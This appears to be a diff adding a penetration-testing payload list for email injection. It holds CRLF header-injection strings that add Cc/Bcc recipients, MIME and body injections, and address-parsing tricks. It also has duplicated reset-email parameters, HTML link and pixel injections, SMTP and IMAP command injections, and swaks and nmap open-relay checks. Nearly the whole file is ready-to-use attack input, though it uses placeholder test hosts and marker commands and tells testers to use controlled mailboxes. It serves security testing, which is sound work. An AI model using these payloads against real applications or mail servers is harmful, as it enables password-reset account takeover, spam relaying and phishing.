@@ -1,0 +1,102 @@
+# Email Injection Payloads
+# Use addresses and mailboxes you control: tester@oast.example.test is the controlled recipient.
+
+# CRLF header injection in an email field (add recipients)
+victim@example.test%0d%0aCc:tester@oast.example.test
+victim@example.test%0d%0aBcc:tester@oast.example.test
+victim@example.test%0aBcc:tester@oast.example.test
+victim@example.test\r\nBcc:tester@oast.example.test
+victim@example.test\nBcc:tester@oast.example.test
+victim@example.test%0d%0aTo:tester@oast.example.test
+victim@example.test,tester@oast.example.test
+victim@example.test;tester@oast.example.test
+victim@example.test tester@oast.example.test
+victim@example.test%0d%0aReply-To:tester@oast.example.test
+victim@example.test%0d%0aFrom:tester@oast.example.test
+
+# Subject and name field injection
+Hello%0d%0aBcc:tester@oast.example.test
+Hello\r\nBcc:tester@oast.example.test
+Hello%0aCc:tester@oast.example.test
+Hello%0d%0aX-Injected:%20email-marker
+Hello%0d%0aContent-Type:%20text/html
+
+# Body injection (end header block, start body)
+Hello%0d%0a%0d%0aemail-body-marker
+Hello%0d%0a%0d%0a<h1>email-html-marker</h1>
+Hello\r\n\r\nemail-body-marker
+
+# MIME structure injection
+Hello%0d%0aContent-Type:%20multipart/mixed;%20boundary=email-boundary%0d%0a%0d%0a--email-boundary%0d%0aContent-Type:%20text/plain%0d%0a%0d%0aemail-mime-marker%0d%0a--email-boundary--
+Hello%0d%0aMIME-Version:%201.0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<b>email-mime-marker</b>
+
+# Encoded-word and unicode variants
+=?UTF-8?B?dmljdGltQGV4YW1wbGUudGVzdA==?=
+=?UTF-8?Q?victim=40example.test?=
+victim@example.test%E5%98%8A%E5%98%8DBcc:tester@oast.example.test
+victim@example.test%c4%8d%c4%8aBcc:tester@oast.example.test
+%00victim@example.test
+
+# Address-parsing confusion (validator vs mail library disagree on the domain)
+"victim@example.test"@oast.example.test
+victim@example.test@oast.example.test
+victim%40example.test@oast.example.test
+victim@example.test(comment)@oast.example.test
+victim(comment)@example.test
+"victim@example.test x"@oast.example.test
+victim@example.test%0d@oast.example.test
+victim@[203.0.113.10]
+victim@example.test.
+victim@oast.example.test\.example.test
+tester@oast.example.test!example.test@example.test
+"<script>"@example.test
+<tester@oast.example.test>@example.test
+victim@oast.example.test,victim@example.test
+victim+tag@example.test
+VICTIM@EXAMPLE.TEST
+vict\ im@example.test
+a@b@c@example.test
+
+# Local-part trick with the target domain as a sub-label of a controlled domain
+victim@example.test.oast.example.test
+victim@oast.example.test#@example.test
+victim@oast.example.test?@example.test
+
+# Reset / invitation duplication (array or duplicated parameter: see HTTP-Parameter-Pollution)
+email=victim@example.test&email=tester@oast.example.test
+email[]=victim@example.test&email[]=tester@oast.example.test
+{"email":["victim@example.test","tester@oast.example.test"]}
+{"email":"victim@example.test","email":"tester@oast.example.test"}
+email=victim@example.test%0d%0acc:tester@oast.example.test
+
+# HTML injection in HTML email (link or image to a controlled host)
+<a href="https://oast.example.test/email-link">email-link-marker</a>
+<img src="https://oast.example.test/email-pixel.png">
+<form action="https://oast.example.test/email-form"><button>email-form-marker</button></form>
+
+# SMTP command injection (webmail or mail proxy sending to a back end; in a field that becomes an SMTP command argument)
+tester@oast.example.test>%0d%0aRCPT TO:<tester@oast.example.test
+tester@oast.example.test>%0d%0aDATA%0d%0aSubject: smtp-marker%0d%0a%0d%0aSMTP-body-marker%0d%0a.%0d%0a
+MAIL FROM:<tester@oast.example.test>%0d%0aRCPT TO:<tester@oast.example.test>
+%0d%0aNOOP%0d%0a
+%0d%0aRSET%0d%0a
+%0d%0aVRFY tester%0d%0a
+%0d%0aEXPN tester%0d%0a
+
+# IMAP command injection (a mailbox name or message number placed into a command; marker commands only)
+INBOX%0d%0aA001 NOOP
+INBOX" %0d%0aA002 CAPABILITY %0d%0a"
+1%0d%0aA003 NOOP
+INBOX%0d%0aA004 LIST "" "*"
+INBOX%0d%0aA005 LOGOUT
+1:* FLAGS)%0d%0aA006 NOOP%0d%0a(
+INBOX" (RFC822.SIZE) %0d%0aA007 NOOP %0d%0a"
+
+# Mail header spoofing checks (SPF/DKIM/DMARC alignment; send only to your own mailbox)
+# dig +short TXT example.test
+# dig +short TXT _dmarc.example.test
+# dig +short TXT default._domainkey.example.test
+
+# Open mail relay checks (run only against hosts you own)
+# swaks --to tester@oast.example.test --from external@oast.example.test --server mail.example.test
+# nmap --script smtp-open-relay -p 25 mail.example.test
